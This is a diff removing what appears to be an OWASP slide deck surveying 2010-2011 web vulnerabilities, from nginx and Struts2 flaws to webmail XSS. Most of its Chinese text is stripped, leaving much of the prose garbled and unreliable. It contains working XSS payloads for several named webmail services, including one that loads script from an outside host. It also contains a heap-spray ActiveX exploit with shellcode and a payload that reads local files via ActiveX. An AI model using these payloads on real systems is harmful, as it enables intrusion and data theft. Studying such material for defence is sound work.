@@ -1,154 +1,0 @@
-  OWASP  
-
-Frank CEO & CTO /OWASP
-­  ­  ­ compliance(SOX, PCI, ISO17799/27001)
- ­  ­ CISSP, CISA, GCIH, GCIA ­ OWASP ­ 2008 ­  ­ 2009
-
- 2010-2011Web  2010-2011Web 0day  2011
- Web
-
- 2010-1
-
-2011-3MYSQL.comsun.com
-MySQL.com dump MySQL4 
-
-2011-4
-51  1000 (FBI) 
-
-2011-6Google Gmail
-
-2011-6
-JS
-
- 2010-2011Web  2010-2011Web 0day  2011
- Web
-
-2010-5nginx
-nginxcgiphp location ~ \.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params; } phplocationURI FastcgiSCRIPT_FILENAMEnginx $fastcgi_script_name$fastcgi_script_name URIPATH_INFO PHPcgi.fix_pathinfo SCRIPT_FILENAME
-
-2010-7Struts2/XWork < 2.2.0
-Struts2webworkwebworkXWork actiongetter/setterhttp httpONGLONGLhttp 
-user.address.city=Bishkek&user['favoriteDrink']=kumys ONGL action.getUser().getAddress().setCity("Bishkek") action.getUser().setFavoriteDrink("kumys") ParametersInterceptor HTTPValueStack.setValue() ONGLsessionscope ONGLjavajava java.lang.RunTime. getRuntime().exec()
-
-2010-9ASP.NETPadding Oracle Attack
-ASP.net(JS) WebResources.axd?d=xyzWebResource.axd d=xyzxyz 500404  Machine Key (web.config) ViewState 
-
-2011-5 Struts XWork `s:submit' HTML
-StrutsJava web  BASH"<s:submit>"Action XWork HTML  Dynamic Method Invocation()
- http://target/model.action!login:cantLogin<script>alert(document .cookie)</script>=some_value
-
-2011-7 phPMyAdmin Remote Code Execution
-phpMyAdmin MysqlWeb 
-
-2011-7 Nginx %00(php)
-Possible Arbitrary Code Execution with Null Bytes, PHP, and Old Versions of nginx
-Ngnix%00FastCGI PHPxxx.jpg%00.php
-In vulnerable versions of nginx, null bytes are allowed in URIs by default (their presence is indicated via a variable named zero_in_uri defined in ngx_http_request.h).
-Individual modules have the ability to opt-out of handling URIs with null bytes. However, not all of them do; in particular, the FastCGI module does not.
-
-2011-8 Apache HTTP ServerRange
-Apache HTTP ServerApache  Web
-Apache HTTP ServerRange  Apache HTTP ServerRange HTTTP Apache
-
-2011-8 phpMyAdmin
-phpMyAdmin 
-table, columnindex  HTML 
-
- 2010-2011Web  2010-2011Web 0day  2011
- Web
-
-2011-3Resin Web
-Resin servlet mapping url-pattern   urlweb servlet
-
-2011-3Resin Web
-Resincom.caucho.server.dispatch.UrlMap urlPatternToRegexpPattern xxx.jsp/xxx.jpg jsp
-
- 2011-3Yahoo Mail Yahoo Mail XSS
-
-Yahoo Mail XSS
- </script><script src=http://xxxx.com/yahoo/xss.xs></script>.htm Yahoo Mail
-Yahoo 
-
- 2011-321CN Mail 21CN XSS
-
-21CN XSS
-<IfRaMe SrC="JaVaScRiPt:alert(/XssTest/)">
-21CNIframe javascriptjavascript
-
- 2011-4 163Mail  XSS
-
- Webmail
-<style> body{ width:expression(alert(/xss/)) } </style>
-webmailstylestyle
-
- Webmail
-
-<style> body{ width:expre/** * * */ssion(alert(/xss/)) } </style>
- 
-
- 2011-4 QQMail QQ MAIL XSS
-
- QQ Webmail
-<video /*'*/onerror/*'*/="javascript:alert(/xss/)"><source> html5
-
- QQ MAIL XSS
-
- 2011-4 HOT Mail HOT MAIL XSS
-
- Hotmail Webmail
-<style> .ExternalClass #ecegdfist {color:rgb(`'abc&x:expression(alert(/xss/)));}</style> Hotmailrgbrgb rgb
-
- 2011-3  139Mail 139mail XSS
-
- 2011-5 ActiveX0DAY
-dll  imageMan.dll 
-
-<object classid="clsid:128D0E38-1FF4-47C3-B0F7-0BAF90F568BF" id="target"></object> <script>
-shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+......);
-nops=unescape('%u9090%u9090'); headersize =20; slackspace= headersize + shellcode.length;
-while(nops.length < slackspace) nops+= nops; fillblock= nops.substring(0, slackspace); block= nops.substring(0, nops.length- slackspace);
-while( block.length+ slackspace<0x50000) block= block+ block+ fillblock; memory=new Array();
-for( counter=0; counter<200; counter++) memory[counter]= block + shellcode;
-s=''; for( counter=0; counter<=1000; counter++)
-s+=unescape("%0D%0D%0D%0D"); target.AutoPic(s,"defaultV"); </script>
-
- 
-
- 2011-5 token
-http ,IP tokentoken token URLURL token
-
- 2011-5 token
-
- KooMail
-
- KooMail
- <img src=# onerror='var XmlHttp=new ActiveXObject("Microsoft.XMLhttp");XmlHttp.Open("get", "c:\\boot.ini",true);XmlHttp.send(null);alert(XmlHttp.responsetext);' /> 
- 
-
- ActiveXboot,ini
-
- ActiveX
-ActiveXDeCryptFileszInFileName szOutFileName,szOutFileName 
-
- 2010-2011Web  2010-2011Web 0day  2011
- Web
-
-Web0day
-1Web() 2Web0day 3 4
-
-
-, (js, flash),  .
- , . , . , QQ . QQIE, , HTML, JavaScript,  .
-: <script type="text/javascript">alert('hahaha');</script> ,  , "hahaha". iframe: <iframe src="http://some" width="100%" height="400"></iframe> ,  , , .
- , , , . , ubb, HTML.
-
-Web2.0
-1 2Web2.0SNS
-
-
-DNS Web  
-
-
-      
-
-
